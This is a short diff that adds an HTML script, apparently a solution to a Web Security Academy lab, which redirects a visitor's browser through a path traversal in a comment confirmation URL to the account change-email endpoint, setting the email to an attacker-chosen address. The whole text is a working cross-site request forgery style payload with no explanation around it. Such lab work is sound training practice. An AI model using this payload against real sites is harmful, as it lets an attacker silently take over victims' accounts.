@@ -1,0 +1,3 @@
+<script>
+  document.location = "https://<LAB-ID>.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
